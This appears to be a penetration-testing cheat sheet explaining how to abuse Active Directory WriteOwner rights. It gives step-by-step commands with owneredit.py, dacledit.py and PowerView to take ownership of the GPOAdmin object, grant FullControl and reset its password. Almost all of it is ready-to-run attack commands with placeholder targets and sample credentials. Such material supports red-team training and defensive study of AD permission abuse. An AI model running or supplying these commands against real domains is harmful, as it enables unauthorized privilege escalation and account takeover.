# 10.12 WriteOwner Abuse owneredit.py dacledit.py

> Take ownership via `owneredit.py`, granting yourself implicit WriteDACL, then chain `dacledit.py` to add the rights you want.

## Overview

WriteOwner on an AD object allows changing the object's OwnerSid. Once ownership is taken, the new owner implicitly has WriteDACL and ReadControl, enabling DACL modification to grant any desired rights. This is not visible in dacledit.py or PowerView DACL output — it only appears in BloodHound's WriteOwner edge or the Owner field. Use owneredit.py from Linux and Set-DomainObjectOwner from Windows, then add rights with dacledit.py or Add-DomainObjectAcl.

## Steps

- BloodHound Cypher MATCH p=((n:User)-[r:WriteOwner]->(m)) RETURN p identifies WriteOwner paths.
- Confirm with dacledit.py -principal pedro -target GPOAdmin (shows WriteOwner ACE in access mask).
- Verify no existing password-reset right exists by trying net rpc password.
- From Linux: download owneredit.py from ShutdownRepo, run -action write -new-owner pedro -target GPOAdmin.
- Grant FullControl (or ResetPassword) with dacledit.py -action write -rights FullControl after taking ownership.
- From Windows: Set-DomainObjectOwner -Identity GPOAdmin -OwnerIdentity pedro; then Add-DomainObjectAcl -Rights All.
- After granting rights, perform the intended attack (e.g., password reset with net rpc password or net user /domain).

## Commands

### BloodHound Cypher — find WriteOwner

```text
MATCH p=((n:User)-[r:WriteOwner]->(m)) RETURN p
```

### Confirm WriteOwner with dacledit.py

```bash
python3 examples/dacledit.py -principal pedro -target GPOAdmin -dc-ip <TARGET> <DOMAIN>.local/pedro:SecuringAD01
```

### Confirm with PowerView

```powershell
$userSID = ConvertTo-SID pedro
```

### Download and run owneredit.py

```bash
wget -q https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py -O ./shutdownRepo/impacket/examples/owneredit.py
```

### Grant FullControl after ownership (dacledit)

```bash
python3 examples/dacledit.py -principal pedro -target GPOAdmin -action write -rights FullControl -dc-ip <TARGET> <DOMAIN>.local/pedro:SecuringAD01
```

### Password reset after granting rights (Linux)

```bash
net rpc password GPOAdmin Mynewpassword1 -U <DOMAIN>.local/pedro%SecuringAD01 -S <TARGET>
```

### Take ownership from Windows (PowerView)

```powershell
Set-DomainObjectOwner -Identity GPOAdmin -OwnerIdentity pedro -Verbose
```

### Grant All rights from Windows (PowerView)

```powershell
Add-DomainObjectAcl -TargetIdentity GPOAdmin -PrincipalIdentity pedro -Rights All -Verbose
```

### Password reset from Windows (net)

```text
C:\Tools> net user GPOAdmin Tryanotherpassword123 /domain
```
